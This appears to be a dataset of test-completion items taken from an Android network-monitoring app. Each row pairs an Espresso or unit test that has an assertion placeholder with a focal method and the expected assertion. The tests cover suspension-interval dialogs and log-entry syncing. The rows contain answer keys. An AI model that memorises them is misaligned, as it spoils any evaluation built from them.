onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 12:00 End: 14:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenThresholdGapAdjustStart() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(19)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(16)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(21))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(45))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 19:16 End: 21:45""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenThresholdGapAdjustStartScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(19)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(16)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(21))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(45))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 19:16 End: 21:45""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenMinGapAdjustStart() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); Interval interval3 = getInterval3(); Time end = new Time(); end.setHour(23); end.setMinute(31); interval3.setEnd(end); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:31""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(0)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(1)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(31))); onView(withId(R.id.imageview_dialog_suspension_interval_select_cancel)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:31""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesOpenMinGapAdjustStartScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); Interval interval3 = getInterval3(); Time end = new Time(); end.setHour(23); end.setMinute(31); interval3.setEnd(end); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:31""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(0)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(1)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(31))); onView(withId(R.id.imageview_dialog_suspension_interval_select_cancel)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:31""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testThreeIntervalsOpenSameInterval() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testThreeIntervalsOpenSameIntervalScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(not(isDisplayed()))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(11))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(3, getDialog().getAdapter().getAllItems().size())
"testOnReceiveMatchingTask() { TestLogEntryUIBroadcastReceiver logEntryUIBroadcastReceiver = createTestReceiver(23); Intent intent = new Intent(TestLogEntryUIBroadcastReceiver.class.getName()); NetworkTask testTask = new NetworkTask(); testTask.setId(23); intent.putExtras(testTask.toBundle()); logEntryUIBroadcastReceiver.onReceive(TestRegistry.getContext(), intent); ""<AssertPlaceHolder>""; }
onReceive(Context context, Intent intent) { NetworkTask task = new NetworkTask(Objects.requireNonNull(intent.getExtras())); Log.d(LogEntryUIBroadcastReceiver.class.getName(), ""Received request for "" + task); if (task.getId() == adapter.getNetworkTask().getId()) { doSync(task); } else { Log.d(LogEntryUIBroadcastReceiver.class.getName(), ""The received request task does not match the adapter task. Skipping sync.""); } }"	assertTrue(logEntryUIBroadcastReceiver.wasDoSyncCalled())
"testOnReceiveMismatchingTask() { TestLogEntryUIBroadcastReceiver logEntryUIBroadcastReceiver = createTestReceiver(23); Intent intent = new Intent(TestLogEntryUIBroadcastReceiver.class.getName()); NetworkTask testTask = new NetworkTask(); testTask.setId(24); intent.putExtras(testTask.toBundle()); logEntryUIBroadcastReceiver.onReceive(TestRegistry.getContext(), intent); ""<AssertPlaceHolder>""; }
onReceive(Context context, Intent intent) { NetworkTask task = new NetworkTask(Objects.requireNonNull(intent.getExtras())); Log.d(LogEntryUIBroadcastReceiver.class.getName(), ""Received request for "" + task); if (task.getId() == adapter.getNetworkTask().getId()) { doSync(task); } else { Log.d(LogEntryUIBroadcastReceiver.class.getName(), ""The received request task does not match the adapter task. Skipping sync.""); } }"	assertFalse(logEntryUIBroadcastReceiver.wasDoSyncCalled())
"testAdapterUpdateLimitExceeded() { NetworkTask task = getNetworkTaskDAO().insertNetworkTask(getNetworkTask()); List<LogEntry> logEntries = new ArrayList<>(); for (int ii = 0; ii < 120; ii++) { LogEntry logEntry = getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task.getId(), new GregorianCalendar(1980, Calendar.MARCH, 17).getTime().getTime())); logEntries.add(logEntry); } LogEntryUIInitTask initTask = new LogEntryUIInitTask(getActivity(activityScenario), task, getAdapter(activityScenario)); initTask.runOnUIThread(logEntries); InstrumentationRegistry.getInstrumentation().waitForIdleSync(); LogEntryAdapter adapter = getAdapter(activityScenario); ""<AssertPlaceHolder>""; }
runOnUIThread(List<LogEntry> logEntries) { Log.d(LogEntryUIInitTask.class.getName(), ""runOnUIThread""); if (logEntries == null || adapterRef == null) { return; } LogEntryAdapter adapter = adapterRef.get(); if (adapter != null) { try { Log.d(NetworkTaskMainUIInitTask.class.getName(), ""Initializing adapter""); adapter.replaceItems(logEntries); adapter.notifyDataSetChanged(); } catch (Exception exc) { Log.e(LogEntryUIInitTask.class.getName(), ""Error initializing adapter"", exc); } } }"	assertEquals(100, adapter.getItemCount())
"testMostRecentLogEntryReturned() { NetworkTask task = getNetworkTaskDAO().insertNetworkTask(getNetworkTask()); LogEntry logEntry = getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task.getId(), new GregorianCalendar(1980, Calendar.MARCH, 17).getTime().getTime())); getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task.getId(), new GregorianCalendar(1980, Calendar.MARCH, 15).getTime().getTime())); LogEntryUISyncTask syncTask = new LogEntryUISyncTask(getActivity(activityScenario), task, getAdapter(activityScenario)); LogEntry syncLogEntry = syncTask.runInBackground(); ""<AssertPlaceHolder>""; }
runInBackground() { Log.d(LogEntryUISyncTask.class.getName(), ""runInBackground""); Log.d(LogEntryUISyncTask.class.getName(), ""Reading log entry for network task "" + networkTask); try { Context context = getActivity(); if (context != null) { LogDAO logDAO = new LogDAO(context); return logDAO.readMostRecentLogForNetworkTask(networkTask.getId()); } } catch (Exception exc) { Log.e(LogEntryUISyncTask.class.getName(), ""Error reading log entry for network task "" + networkTask, exc); } return null; }"	assertTrue(logEntry.isEqual(syncLogEntry))
